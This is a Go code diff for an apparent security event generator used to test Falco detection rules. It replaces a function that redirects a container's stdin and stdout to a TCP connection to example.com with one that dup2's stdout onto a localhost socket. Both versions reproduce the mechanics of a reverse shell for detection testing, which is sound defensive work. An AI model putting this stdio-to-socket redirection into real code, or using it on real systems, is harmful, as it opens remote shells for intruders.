@@ -15,63 +15,56 @@ limitations under the License.
 package syscall
 
 import (
-    "bufio"
-    "net"
-    "os"
-    "syscall"
+	"net"
+	"os"
+	"syscall"
 
-    "github.com/falcosecurity/event-generator/events"
+	"github.com/falcosecurity/event-generator/events"
 )
 
-var _ = events.Register(RedirectStdoutStdinToNetworkConnectionInContainer)
+var _ = events.Register(RedirectStdoutStdinFromContainer)
 
-func RedirectStdoutStdinToNetworkConnectionInContainer(h events.Helper) error {
-    if h.InContainer() {
-        // Connect to a remote host
-        conn, err := net.Dial("tcp", "example.com:80")
-        if err != nil {
-            h.Log().WithError(err).Error("Failed to connect to remote host")
-            return err
-        }
-        defer conn.Close()
+var (
+	remoteAddr string = "localhost:8080"
+)
 
-        // retrieve file descriptor of the connection
-        tcpConn, ok := conn.(*net.TCPConn)
-        if !ok {
-            h.Log().Error("Failed to get TCP connection")
-            return nil
-        }
+func RedirectStdoutStdinFromContainer(h events.Helper) error {
+	if h.InContainer() {
+		listener, _ := net.Listen("tcp", remoteAddr)
+		defer listener.Close()
+		// Accept incoming connections in a separate goroutine
+		connChan := make(chan net.Conn)
+		go func() {
+			conn, _ := listener.Accept()
+			connChan <- conn
+		}()
 
-        file, err := tcpConn.File()
-        if err != nil {
-            h.Log().WithError(err).Error("Failed to get file descriptor from connection")
-            return err
-        }
-        defer file.Close()
+		// Create a client connection
+		clientConn, _ := net.Dial("tcp", remoteAddr)
+		defer clientConn.Close()
 
-        fd := int(file.Fd())
+		// Wait for the server connection
+		serverConn := <-connChan
 
-        // Duplicate the file descriptor of the connection to stdout (1) and stdin (0)
-        err = syscall.Dup3(fd, 1, 0)
-        if err != nil {
-            h.Log().WithError(err).Error("Failed to duplicate file descriptor to stdout")
-            return err
-        }
-        err = syscall.Dup3(fd, 0, 0)
-        if err != nil {
-            h.Log().WithError(err).Error("Failed to duplicate file descriptor to stdin")
-            return err
-        }
+		// Redirect stdout to the network connection
+		redirectStdout(serverConn)
+	}
+	return &events.ErrSkipped{
+		Reason: "'Redirect Stdout/Stdin From Container' is applicable only to containers.",
+	}
+}
 
-        // Read from stdin (now redirected to the network connection)
-        scanner := bufio.NewScanner(os.Stdin)
-        if scanner.Scan() {
-            scanner.Text()
-            h.Log().Infof("Redirect stdout/stdin to network connection")
-        } else {
-            h.Log().Error("Failed to read from stdin")
-        }
-    } 
+func redirectStdout(conn net.Conn) error {
+	// Duplicate the file descriptor of the network connection
+	remoteFile, _ := conn.(*net.TCPConn).File()
+	defer remoteFile.Close()
 
-    return nil
+	// Duplicate the file descriptor of stdout
+	stdoutFile := os.Stdout.Fd()
+
+	// Redirect stdout to the network connection using dup2
+	if err := syscall.Dup2(int(remoteFile.Fd()), int(stdoutFile)); err != nil {
+		return err
+	}
+	return nil
 }
